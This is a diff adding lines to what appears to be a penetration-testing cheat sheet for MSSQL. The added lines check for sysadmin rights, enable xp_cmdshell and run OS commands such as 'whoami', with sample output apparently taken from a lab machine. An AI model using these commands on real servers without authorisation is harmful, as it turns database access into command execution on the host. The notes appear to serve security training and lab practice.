@@ -222,6 +222,17 @@ MSSQL
   `# nmap -n -Pn -p1433 --script "ms-sql-* and not ms-sql-brute" --script-args mssql.username=sa,mssql.password=<pw> 10.11.1.31`  
 - Impacket mssqlclient.py:   
   `mssqlclient.py HOSTNAME/USERNAME:'PASSWORD'@10.10.10.22 -windows-auth`   
+  Check if the user is sysadmin:   
+  `SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')`  
+  `-----------`   
+  `1`  
+  Run OS commands through xp_cmdshell:  
+  `SQL> EXEC sp_configure 'xp_cmdshell', 1`  
+  `[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.`  
+  `SQL> reconfigure;`  
+  `SQL> xp_cmdshell "whoami"` 
+  `[...]`  
+  `hostname\sql_svc`  
   
 MySQL 
 - Enumerate tables:  
